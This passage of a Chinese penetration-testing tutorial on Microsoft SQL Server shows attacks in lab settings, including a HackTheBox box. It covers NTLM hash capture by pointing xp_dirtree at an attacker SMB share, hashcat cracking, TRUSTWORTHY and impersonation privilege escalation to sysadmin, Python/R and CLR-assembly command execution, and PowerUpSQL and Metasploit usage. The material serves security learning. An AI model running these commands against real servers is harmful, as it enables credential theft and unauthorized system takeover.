+<h2 id="5-NTLM"><a href="#5-NTLM" class="headerlink" title="5.NTLM"></a>5.NTLM</h2><h3 id="5-1-环境"><a href="#5-1-环境" class="headerlink" title="5.1 环境"></a>5.1 环境</h3><p>  我本地搭建的环境访问<code>smb</code>时，没有接收到<code>NTLM</code>。所以我这里改为使用<code>hackthebox Querier</code>靶机</p>
+<h3 id="5-2-利用"><a href="#5-2-利用" class="headerlink" title="5.2 利用"></a>5.2 利用</h3><p>  当我们登录到目标<code>mssql</code>服务中，但是没有办法开启或使用<code>xp_cmdshell</code>，可以利用<code>smb中继</code>攻击获取<code>NTLM</code>，然后使用<code>hashcat</code>等工具进行破解</p>
+<p>  开启<code>Responder</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I tun1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/SHelwuzUBafEQDR.png" alt="image-20220205143341667"></p>
+<p>  使用<code>xp_dirtree或xp_fileexist</code>访问<code>smb中继</code>地址</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_dirtree &#x27;\\10.10.16.3\share\file&#x27;</span><br><span class="line">exec xp_fileexist &#x27;\\10.10.16.3\share\file&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/FrXiU3gMQlPJj5B.png" alt="image-20220205143601693"></p>
+<p>  <code>hashcat</code>破解<code>NTLM</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 ./<span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/fmLOK4CX27YF5iN.png" alt="image-20220205143915992"></p>
+<h2 id="6-提权"><a href="#6-提权" class="headerlink" title="6.提权"></a>6.提权</h2><p><strong>sql server 权限</strong></p>
+<p>  如果想了解<code>sql server</code>权限细节建议看下官方手册</p>
+<p>  <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver15">数据库角色权限</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver15">服务器角色权限</a></p>
+<h3 id="6-1可信提权"><a href="#6-1可信提权" class="headerlink" title="6.1可信提权"></a>6.1可信提权</h3><h4 id="6-1-1-环境配置"><a href="#6-1-1-环境配置" class="headerlink" title="6.1.1 环境配置"></a>6.1.1 环境配置</h4><p>  添加<code>ling</code>数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- Create database</span><br><span class="line">CREATE DATABASE LingDB;</span><br><span class="line">-- Verify sa is the owner of the application database</span><br><span class="line">SELECT suser_sname(owner_sid)</span><br><span class="line">FROM sys.databases</span><br><span class="line">WHERE name = &#x27;LingDB&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/H28oIsbiUqQf6xN.png" alt="image-20220204141517157"></p>
+<p>  添加一个登录使用的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- Create login</span><br><span class="line">CREATE LOGIN lingUser WITH PASSWORD = &#x27;lingpassword&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/Uo5Nw9Jh2XCzgED.png" alt="image-20220204141338570"></p>
+<p>  添加<code>lingUser</code>到<code>db_owner</code>权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- Setup LingUser the db_owner role in LingDB;</span><br><span class="line">USE LingDB</span><br><span class="line">ALTER LOGIN [LingUser] with default_database = [LingDB];</span><br><span class="line">CREATE USER [LingUser] FROM LOGIN [LingUser];</span><br><span class="line">EXEC sp_addrolemember [db_owner], [LingUser];</span><br></pre></td></tr></table></figure>
+
+<p>  查询<code>lingUser</code>是否成功添加到<code>db_owner</code>权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- Verify the user was added as db_owner</span><br><span class="line">select rp.name as database_role, mp.name as database_user</span><br><span class="line">from sys.database_role_members drm</span><br><span class="line">join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)</span><br><span class="line">join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/qGpItJn2zevXAlf.png" alt="image-20220204142128339"></p>
+<p>  将<code>LingDB</code>数据库设置为<code>trusted</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE LingDb SET TRUSTWORTHY ON</span><br></pre></td></tr></table></figure>
+
+<p>  查询<code>Sql Server</code>中的所有数据库，并且图下<code>is_trustworthy_on</code>应该显示为<code>1</code></p>
+<p><img src="https://s2.loli.net/2022/02/06/7YGQJ6W9sjkM52R.png" alt="image-20220204142813151"></p>
+<p>  启动<code>xp_cmdshell</code>，为了实验方便所以这里先启动，在实战中攻击者是由可能启动的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- Enable show options</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">-- Enable xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/voh8gcPTx1LX5rV.png" alt="image-20220204143144625"></p>
+<h4 id="6-1-2-利用"><a href="#6-1-2-利用" class="headerlink" title="6.1.2 利用"></a>6.1.2 利用</h4><p>  验证一下我们当前权限</p>
+<p>  使用<code>xp_cmdshell</code>失败，提示我们没有权限</p>
+<p><img src="https://s2.loli.net/2022/02/06/XWKJi9CngFTA6tb.png" alt="image-20220204155602398"></p>
+<p>  查看我们当前权限，显示我们非管理员</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT is_srvrolemember(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/yhoUn3BkCwOm9ca.png" alt="image-20220204155724885"></p>
+<p>  现在验证权限完毕，开始</p>
+<p>  先选择<code>LingDB</code>数据库，然后将<code>lingUser</code>添加到<code>sysadmin</code></p>
+<p>  如果<code>sp_elevate_me</code>对象已经存在，只需要重新另起一个即可，比如<code>sp_elevate_me1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE LingDB</span><br><span class="line">CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember &#x27;lingUser&#x27;,&#x27;sysadmin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/Jn6MoyBQh251OUE.png" alt="image-20220204160255441"></p>
+<p>  <code>lingUser</code>添加到<code>sysadmin</code>后，我们当前还没获得<code>管理</code>权限，还需要进行下面两步操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE LingDB</span><br><span class="line">EXEC sp_elevate_me</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/To7bYGxXpsV3Jf8.png" alt="image-20220204160431172"></p>
+<p>  进行上面的操作后我们当前就变成<code>管理</code>权限</p>
+<p><img src="https://s2.loli.net/2022/02/06/rCiItpBksTFRHJ8.png" alt="image-20220204160520748"></p>
+<p><strong>Metasploit</strong></p>
+<p>  除上面介绍的手动提权外，你还可以使用<code>Metasploit </code>进行自动提权</p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/mssql/mssql_escalate_dbowner</span><br><span class="line">set RHOSTS <span class="number">192.168</span>.1.1</span><br><span class="line">set USERNAME lingUser</span><br><span class="line">set PASSWORD lingpassword</span><br><span class="line">run </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-1-3-原理"><a href="#6-1-3-原理" class="headerlink" title="6.1.3 原理"></a>6.1.3 原理</h4><p>  受信任的低权限用户执行一些模块时，会被视为高权限执行的。但是执行这些模块需要一定的权限.</p>
+<p><img src="https://s2.loli.net/2022/02/06/EO1amIf7qJrnupY.png" alt="image-20220204163024791"></p>
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></p>
+<h3 id="6-2-语言提权"><a href="#6-2-语言提权" class="headerlink" title="6.2 语言提权"></a>6.2 语言提权</h3><p>  <code>Sql server 2017(14.x)</code>及更高版本都可以使用一个叫<code>机器学习服务</code>的功能，这个功能会给用户选择安装<code>python或R</code>语言。利用语言提权需要<code>db_owner</code>权限才可以执行，同时需要<code>sql server</code>启动<code>Launchpad</code>才能利用。</p>
+<h4 id="6-2-1-环境安装"><a href="#6-2-1-环境安装" class="headerlink" title="6.2.1 环境安装"></a>6.2.1 环境安装</h4><p>  检测外部脚本是否可以启动，同时将<code>config_value、run_value</code>设置为<code>1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#检测外部脚本是否可以启动</span><br><span class="line">sp_configure &#x27;external scripts enabled&#x27;</span><br><span class="line">#设置外部脚本指令</span><br><span class="line">EXEC sp_configure  &#x27;external scripts enabled&#x27;, 1</span><br><span class="line">#重新安装配置指令</span><br><span class="line">RECONFIGURE WITH OVERRIDE</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/RPyCMj4g9kuHOBY.png" alt="image-20220204172536691"></p>
+<p>  将<code>sql Server Launchpad</code>设置为自动启动模式，设置完后还需要手动启动一下</p>
+<p><img src="https://s2.loli.net/2022/02/06/wqXofu1Y5lCgA8T.png" alt="image-20220204172913893"></p>
+<p>  重启<code>sql server</code></p>
+<h4 id="6-2-2-python-提权"><a href="#6-2-2-python-提权" class="headerlink" title="6.2.2 python 提权"></a>6.2.2 python 提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_execute_external_script @language =N&#x27;Python&#x27;, @script = N&#x27;import os; os.system(&quot;whoami&quot;);&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/i7z2kfdX5KLPl3J.png" alt="image-20220204171643231"></p>
+<h4 id="6-2-3-R-提权"><a href="#6-2-3-R-提权" class="headerlink" title="6.2.3 R 提权"></a>6.2.3 R 提权</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE sp_execute_external_script @language = N<span class="string">&#x27;R&#x27;</span>, @script = N<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/rOCNUI4DXlsPLtc.png" alt="image-20220204171615768"></p>
+<h3 id="6-3-mssql-模拟登录提权"><a href="#6-3-mssql-模拟登录提权" class="headerlink" title="6.3 mssql 模拟登录提权"></a>6.3 mssql 模拟登录提权</h3><h4 id="6-3-1-环境配置"><a href="#6-3-1-环境配置" class="headerlink" title="6.3.1 环境配置"></a>6.3.1 环境配置</h4><p>  创建<code>4个</code>用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- Create login 1</span><br><span class="line">CREATE LOGIN ling1 WITH PASSWORD = &#x27;lingpassword&#x27;;</span><br><span class="line"></span><br><span class="line">-- Create login 2</span><br><span class="line">CREATE LOGIN ling2 WITH PASSWORD = &#x27;lingpassword!&#x27;;</span><br><span class="line"></span><br><span class="line">-- Create login 3</span><br><span class="line">CREATE LOGIN ling3 WITH PASSWORD = &#x27;lingpassword!&#x27;;</span><br><span class="line"></span><br><span class="line">-- Create login 4</span><br><span class="line">CREATE LOGIN ling4 WITH PASSWORD = &#x27;lingpassword!&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>  给<code>ling1</code>赋予<code>ling2、3</code>和<code>sa</code>的登录的模拟权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- Grant ling1 impersonate privilege on ling2, ling3, and sa</span><br><span class="line">USE master;</span><br><span class="line">GRANT IMPERSONATE ON LOGIN::sa to [ling1];</span><br><span class="line">GRANT IMPERSONATE ON LOGIN::ling2 to [ling1];</span><br><span class="line">GRANT IMPERSONATE ON LOGIN::ling3 to [ling1];</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-3-2-利用"><a href="#6-3-2-利用" class="headerlink" title="6.3.2 利用"></a>6.3.2 利用</h4><p>  使用<code>ling1</code>登录到<code>sql server</code></p>
+<p>  <strong>搜索可以被冒用的用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#x27;IMPERSONATE&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/xqwT7EGrN8DU5vH.png" alt="image-20220204200122102"></p>
+<p>  <strong>验证当前权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/Cm62n54zlAgsNFQ.png" alt="image-20220204200529933"></p>
+<p>  <strong>冒用<code>sa</code>用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE AS LOGIN = &#x27;sa&#x27;</span><br><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/87OXlSvLrVWdyq4.png" alt="image-20220204200628312"></p>
+<p><strong>Metasploit</strong></p>
+<p>  <code>mssql_escalate_execute_as</code>是通过登录<code>mssql</code>进行提权</p>
+<p>  <code>mssql_escalate_execute_as_sqli</code>则是通过注入方式进行提权</p>
+  <figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/mssql/mssql_escalate_execute_as</span><br><span class="line">auxiliary/admin/mssql/mssql_escalate_execute_as_sqli</span><br></pre></td></tr></table></figure>
+
+<p>  模拟登录除了提权之外还有别的利用方式，比如<code>以系统管理员模拟SQL登录</code>、<code>域管理员模拟为系统管理员</code>等</p>
+<h4 id="6-3-3-原理"><a href="#6-3-3-原理" class="headerlink" title="6.3.3 原理"></a>6.3.3 原理</h4><p>  <code>SQL SERVER</code>为了方便开发人员临时使用其他账号权限而设置的一个功能，攻击者可以利用该功能进行提权。这种类型是否算是漏洞？这个见仁见智。</p>
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></p>
+<h2 id="7-CLR"><a href="#7-CLR" class="headerlink" title="7.CLR"></a>7.CLR</h2><h3 id="7-1-什么是CLR"><a href="#7-1-什么是CLR" class="headerlink" title="7.1 什么是CLR"></a>7.1 什么是CLR</h3><p>  <code>Common Language Runtime(CLR)</code>是 <code>Microsoft</code> 作为其 <code>Windows </code>操作系统的一部分提供的一项功能，允许执行与 <code>.NET Framework</code> 兼容的软件。此运行时环境负责实现 <code>.NET</code> 程序，包括已编译的 <code>ASP.NET</code> 页面和 <code>Mono</code> 应用程序。它由 <code>.NET Framework</code> 和 <code>Windows</code> 内核使用，并已被 J<code>ava ME、Apache Harmony 和 Android</code> 等其他操作系统采用。它通常被认为是 <code>Java 虚拟机 (JVM) </code>的更稳定和功能齐全的替代品。它还管理 <code>Microsoft</code> 操作系统的代码执行环境。<br>这些托管代码被编译并由单元进一步使用。这些单元称为装配。这些程序集包含大量 <code>DLL </code>或<code> EXE</code> 文件。<code>EXE </code>文件可以自行执行，而 DLL 文件需要托管在应用程序中。如果管理得当，这些 <code>DLL </code>文件也可以由<code>MS-SQL</code>服务器强制执行。<br><code>CLR </code>通过程序集加载从不同进程接收已编译的应用程序或程序集，然后在隔离的执行环境中执行它们以确保它们的安全性和完整性。借助 <code>CLR</code>，可以编写存储过程、用户定义函数、用户定义类型等。</p>
+<h3 id="7-2-环境安装"><a href="#7-2-环境安装" class="headerlink" title="7.2 环境安装"></a>7.2 环境安装</h3><p>  启动<code>Facets</code></p>
+<p><img src="https://s2.loli.net/2022/02/06/IuN6qiFhP1j7OnC.png" alt="image-20220205174149309"></p>
+<p>  选择最后的<code>外围应用配置器</code></p>
+<p><img src="img/image-20220205174251491.png" alt="image-20220205174251491"></p>
+<p>  将<code>ClrIntegrationEnabled</code>设置为<code>True</code></p>
+<p><img src="https://s2.loli.net/2022/02/06/PAzftGgUQFYI9Ek.png" alt="image-20220205174341987"></p>
+<h3 id="7-3-创建DLL"><a href="#7-3-创建DLL" class="headerlink" title="7.3 创建DLL"></a>7.3 创建DLL</h3><p>  打开<code>Visual Studio </code>选择创建新项目</p>
+<p><img src="https://s2.loli.net/2022/02/06/x1rI9bFYu3mpSZ6.png" alt="image-20220205184253542"></p>
+<p>  进入项目模块选择时，选择<code>C#</code>，找到<code>.NET Framework</code></p>
+<p><img src="https://s2.loli.net/2022/02/06/7Mm6y2DVNCXHUSK.png" alt="image-20220205184519542"></p>
+<p>  配置项目信息，开始创建</p>
+<p><img src="https://s2.loli.net/2022/02/06/GoLETsciBJPfkRH.png" alt="image-20220205184641115"></p>
+<p>  生成<code>dll</code>文件</p>
+<p>  <a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/#Import">dll代码链接</a></p>
+<p><img src="https://s2.loli.net/2022/02/06/GOpeJzN2cys1Udx.png" alt="image-20220205184819125"></p>
+<p>  把<code>dll</code>文件上传到目标</p>
+<h3 id="7-4-利用"><a href="#7-4-利用" class="headerlink" title="7.4 利用"></a>7.4 利用</h3><p><strong>手动利用</strong></p>
+<p>  在<code>数据库&gt;&gt;系统数据库&gt;&gt;msdb&gt;&gt;可编程性&gt;&gt;程序集</code>右键打开<code>新建程序集</code></p>
+<p><img src="https://s2.loli.net/2022/02/06/mBslVxWrKUg3nAk.png" alt="image-20220205185919575"></p>
+<p>  设置权限集为<code>无限制</code>，添加程序集路径</p>
+<p><img src="https://s2.loli.net/2022/02/06/bPRl4JYx6GDuwTj.png" alt="image-20220205190107569"></p>
+<p>  添加完成可以在<code>程序集</code>看到添加的<code>dll</code></p>
+<p>  启动<code>lingdll</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [lingdll].[StoredProcedures].[cmd_exec];</span><br></pre></td></tr></table></figure>
+
+<p>  启动<code>dll</code>后就可以运行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd_exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/4P6VYoySKJBurcH.png" alt="image-20220205190327589"></p>
+<p>  如果后面想删除加载的<code>dll</code>可以运行下面命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE  cmd_exec</span><br><span class="line">DROP ASSEMBLY lingdll</span><br></pre></td></tr></table></figure>
+
+
+
+<p>**命令加载<code>dll**</code></p>
+<p>  选择<code>msdb</code>数据库</p>
+<p><img src="https://s2.loli.net/2022/02/06/g5ZAFYWX2nCr8do.png" alt="image-20220205191617689"></p>
+<p>  启动<code>CLR </code>集成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;clr enabled&#x27;, 1;</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/N19zT7R6IEWZVev.png" alt="image-20220205191741451"></p>
+<p>  查询是否启动<code>CLR</code></p>
+<p>  使用<code>mssqlclint</code>是看不到返回结果，使用其他如<code>Navicat</code>可以看到结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM sys.configurations WHERE name = &#x27;clr%20enabled&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/kIAQaKEHSRs7nfU.png" alt="image-20220205192255676"></p>
+<p>  <code>value</code>显示为<code>1</code>时，代表<code>CLR</code>集成已启用</p>
+<p>  启动可信赖属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE msdb SET TRUSTWORTHY ON</span><br></pre></td></tr></table></figure>
+
+<p>  查询<code>可信赖属性</code>是否启动成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name, is_trustworthy_on from sys.databases</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/3KaeEyvYNZO8fPs.png" alt="image-20220205192618908"></p>
+<p>  当<code>msdb</code>值为<code>1</code>时，意味着该属性已经启用</p>
+<p>  加载<code>dll</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY lingdll FROM &#x27;c:\temp\lingdll.dll&#x27; WITH PERMISSION_SET = UNSAFE;</span><br></pre></td></tr></table></figure>
+
+<p>  加载<code>dll</code>遇到说程序集不受信任，可以换成<code>Navicat</code>重新加载，也可以给程序集加上<code>哈希</code></p>
+<p>  加上<code>hash</code>这个我还没了解细节，只是发现加上可以加载<code>dll</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_add_trusted_assembly 0x8893AD6D78D14EE43DF482E2EAD44123E3A0B684A8873C3F7BF3B5E8D8F09503F3E62370CE742BBC96FE3394477214B84C7C1B0F7A04DCC788FA99C2C09DFCCC, </span><br><span class="line">N&#x27;pointudt, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>  创建<code>cmd_exec</code>，执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [lingdll].[StoredProcedures].[cmd_exec];</span><br><span class="line">cmd_exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/P6OyjehZrl3Q9bd.png" alt="image-20220205194623820"></p>
+<p><strong>PowerUpSQL</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL">Github</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerUpSQL.ps1</span><br><span class="line">Create<span class="literal">-SQLFileCLRDll</span> <span class="literal">-ProcedureName</span> <span class="string">&quot;runcmd&quot;</span> <span class="literal">-OutFile</span> runcmd <span class="literal">-OutDir</span> c:\temp <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/rFYfplW8RoETjP6.png" alt="image-20220205195055836"></p>
+<p>  生成的<code>dll</code>文件也可以像上面那样利用，现在介绍另一种利用方式</p>
+<p>  打开生成的<code>runcmd.txt</code></p>
+<p><img src="https://s2.loli.net/2022/02/06/Bcxr3kHUIsQ1KYo.png" alt="image-20220205195354157"></p>
+<p>  使用<code>Navicat</code>链接服务器,<code>mssqlclient.py</code>可能会失败</p>
+<p>  输入<code>txt</code>内容并运行</p>
+<p><img src="https://s2.loli.net/2022/02/06/BSb6NOenCfuwgkJ.png" alt="image-20220205195541531"></p>
+<p><strong>PowerUpSQL(远程)</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerUpSQL.ps1</span><br><span class="line"><span class="built_in">Invoke-SQLOSCmdCLR</span> <span class="literal">-Username</span> sa <span class="literal">-Password</span> <span class="number">123456</span> <span class="literal">-Instance</span> <span class="number">192.168</span>.<span class="number">1.7</span> Command <span class="string">&quot;whoami&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/s7fUjCMKxvPEhbH.png" alt="image-20220205195804269"></p>
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-clr-assembly/">https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-clr-assembly/</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/#Import">https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/#Import</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sys-sp-add-trusted-assembly-transact-sql?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sys-sp-add-trusted-assembly-transact-sql?view=sql-server-ver15</a></p>
+<h2 id="8-SP-OACREATE"><a href="#8-SP-OACREATE" class="headerlink" title="8.SP_OACREATE"></a>8.SP_OACREATE</h2><p>  有时候<code>xp_cmdshell</code>组件被删除或被禁用后，我们可以使用<code>SP_OACREATE</code>来执行系统命令，但是使用<code>SP_OACREATE</code>执行命令是无回显的。</p>
+<h3 id="8-1-检测SP-OACREATE状态"><a href="#8-1-检测SP-OACREATE状态" class="headerlink" title="8.1 检测SP_OACREATE状态"></a>8.1 检测SP_OACREATE状态</h3><p>  使用<code>mssqlclient</code>返回结果会有点乱</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/IWiBPqgSvDesC2k.png" alt="image-20220206141854660"></p>
+<p>  使用<code>count</code>判断<code>sp_oacreate</code>即可</p>
